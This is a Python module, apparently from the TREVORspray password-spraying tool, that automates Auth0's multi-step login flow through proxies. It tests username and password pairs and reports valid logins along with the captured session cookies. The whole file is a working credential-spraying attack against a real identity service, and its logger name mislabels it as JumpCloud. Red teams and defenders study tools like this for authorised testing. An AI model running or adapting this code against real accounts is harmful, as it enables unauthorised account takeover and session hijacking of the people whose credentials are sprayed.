import logging
import requests
from .base import BaseSprayModule

from urllib.parse import urlparse, parse_qs

log = logging.getLogger("trevorspray.sprayers.jumpcloud")


class Auth0(BaseSprayModule):
    default_url = "https://auth0.com"

    userparam = "username"

    def create_request(self, username, password, proxythread):
        request = super().create_request(username, password, proxythread)

        # 1 - GET https://auth0.com/api/auth/login?redirectTo=dashboard
        response_1 = requests.get(
            "https://auth0.com/api/auth/login?redirectTo=dashboard",
            proxies=proxythread.proxy_arg,
            headers=self.headers,
            allow_redirects=True,
        )
        try:
            cookies = response_1.history[-1].cookies
        except IndexError:
            cookies = response_1.cookies
        cookies.pop("state", "")
        parsed_url = urlparse(response_1.url)
        query_params = parse_qs(parsed_url.query)
        state = query_params.get("state", [""])[0]
        log.debug(f"State: {state}")

        url = f"https://auth0.auth0.com/u/login/identifier?state={state}"
        data = {
            "state": state,
            "username": username,
            "js-available": "true",
            "webauthn-available": "true",
            "is-brave": "false",
            "webauthn-platform-available": "false",
            "action": "default",
        }

        # 2 - POST https://auth0.auth0.com/u/login/identifier?state=<state>
        headers = {
            "Referrer": f"https://auth0.auth0.com/u/login/identifier?state={state}"
        }
        response_2 = requests.post(
            url,
            proxies=proxythread.proxy_arg,
            cookies=cookies,
            headers=headers,
            data=data,
        )
        # 3 - POST https://auth0.auth0.com/u/login/password?state=<state>
        cookies.update(response_2.cookies)

        url = f"https://auth0.auth0.com/u/login/password?state={state}"
        data = {
            "state": state,
            "username": username,
            "password": password,
            "action": "default",
        }

        request.url = url
        request.headers.update(
            {
                "Origin": "https://auth0.auth0.com",
                "Referrer": url,
            }
        )
        request.data = data
        request.cookies = cookies
        return request

    def check_response(self, response):
        valid = False
        exists = None
        locked = None
        msg = ""

        status_code = getattr(response, "status_code", 0)
        msg = f"Response code {status_code}"

        if "auth0" in response.cookies:
            msg = ""
            exists = True
            valid = True
            location = response.headers.get("Location", "")
            if location:
                msg = f"Location: {location}\n"
            msg += "Cookie: "
            for k, v in response.cookies.items():
                msg += f"{k}={v};"

        return (valid, exists, locked, msg)
